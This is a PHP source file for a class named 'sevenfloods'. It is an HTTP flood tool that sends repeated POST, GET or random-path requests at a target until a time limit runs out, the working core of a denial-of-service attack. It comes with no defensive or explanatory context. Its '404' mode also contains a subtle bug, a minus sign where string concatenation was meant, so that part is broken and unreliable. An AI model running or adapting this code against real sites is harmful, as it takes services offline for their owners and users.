<?php
class sevenfloods{
	private $ip;
	private $max_time;
	private $method;
	public function __construct($ip, $max_time, $method) {
		$this->ip = $ip;
		$this->max_time = $max_time;
		$this->method = $method;
	}
	function start(){
		$packet = 0;
		while(1){ 
			$packet++; 
			if(time() > $this->max_time){
				return $packet;
				break; 
			}
			if($this->method=="POST"){
				$ch = curl_init();  
				curl_setopt($ch, CURLOPT_URL, $this->ip);
				curl_setopt($ch, CURLOPT_HEADER, 0);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
				curl_setopt($ch, CURLOPT_POSTFIELDS, "CICA");
				curl_exec($ch);
			}
			if($this->method=="GET"){
				$ch = curl_init();  
				curl_setopt($ch, CURLOPT_URL, $this->ip);
				curl_setopt($ch, CURLOPT_HEADER, 0);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
				curl_exec($ch);
			}
			if($this->method=="404"){
				$ch = curl_init();  
				curl_setopt($ch, CURLOPT_URL, $this->ip . "/" - rand());
				curl_setopt($ch, CURLOPT_HEADER, 0);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
				curl_exec($ch);
			}
		}
	}
}
?>